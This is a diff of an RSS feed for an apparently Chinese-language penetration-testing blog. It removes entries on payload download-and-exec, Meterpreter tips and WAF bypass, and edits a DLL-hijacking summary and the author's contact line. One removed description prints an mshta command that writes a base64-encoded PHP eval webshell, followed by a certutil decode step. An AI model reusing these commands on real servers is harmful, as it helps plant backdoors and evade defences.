@@ -147,15 +147,6 @@
     </item>
     
     <item>
-      <title>Download Payload AND Exec</title>
-      <link>https://04z.net/post/download-remote-payload-and-exec/</link>
-      <pubDate>Wed, 29 Nov 2017 19:34:24 +0000</pubDate>
-      
-      <guid>https://04z.net/post/download-remote-payload-and-exec/</guid>
-      <description>0x00 起因 一群大黑客,随便上传东西到别人的服务器，这样是不道德滴。 攻击脚本参考: HTA-SCT-DLL-WMI 后渗透阶段的攻防对抗 Atomic-Red-Team 进入正题: 1 2 3 4 5 6 任意代码执行 – 例如</description>
-    </item>
-    
-    <item>
       <title>[译] 15-ways-bypass-powershell-exec</title>
       <link>https://04z.net/post/%E8%AF%91-15-way-bypass-powershell-exec/</link>
       <pubDate>Wed, 29 Nov 2017 18:47:11 +0000</pubDate>
@@ -179,7 +170,7 @@
       <pubDate>Thu, 03 Aug 2017 20:46:44 +0000</pubDate>
       
       <guid>https://04z.net/post/dll-attack/</guid>
-      <description>0x01 DLL劫持漏洞根源 程序在调用DLL时未指明DLL的完整路径 1 2 3 4 `3gstudent`提到的DLL劫持漏洞微软尚未给出直接的修复方法，原</description>
+      <description>0x01 DLL劫持漏洞根源 程序在调用DLL时未指明DLL的完整路径 提到的DLL劫持漏洞微软尚未给出直接的修复方法，原因可能有以下几点：(by 3gstudent) 这是</description>
     </item>
     
     <item>
@@ -219,30 +210,12 @@
     </item>
     
     <item>
-      <title>Meterpreter-Tips</title>
-      <link>https://04z.net/post/meterpreter-tips/</link>
-      <pubDate>Thu, 01 Jun 2017 21:30:04 +0000</pubDate>
-      
-      <guid>https://04z.net/post/meterpreter-tips/</guid>
-      <description>meterpreter在内网中的作用就跟web中的sqlmap和burpsuite的价值是一样的。本文只涉及内网，持续更新 0x01 枚举linux可</description>
-    </item>
-    
-    <item>
-      <title>bypass-waf-put-Webshell</title>
-      <link>https://04z.net/post/bypass-waf-put-webshell/</link>
-      <pubDate>Wed, 31 May 2017 15:27:01 +0000</pubDate>
-      
-      <guid>https://04z.net/post/bypass-waf-put-webshell/</guid>
-      <description>利用常见的系统工具进行编码解码绕过某些防护软件写入webshell 0x01 编码绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # mshta vbscript:createobject(&amp;#34;scripting.filesystemobject&amp;#34;).createtextfile(&amp;#34;yijuhua.txt&amp;#34;,2,ture).writeline(&amp;#34;PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOz8+Cg==&amp;#34;)(window.close) # certutil -decode yijuhua.txt shell.txt # type shell.txt # echo 48 65 6C 6C</description>
-    </item>
-    
-    <item>
       <title>About Me</title>
       <link>https://04z.net/post/friends/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://04z.net/post/friends/</guid>
-      <description>连简介都懒得写的菜逼 774299952@qq.com -- My Friends (dlddw) c4rt1y backlion 3gstudent evi1cg lostwolf klion duoluo</description>
+      <description>连简介都懒得写的菜逼 WX: study1ng My Friends (dlddw) c4rt1y backlion 3gstudent evi1cg lostwolf klion duoluo</description>
     </item>
     
   </channel>
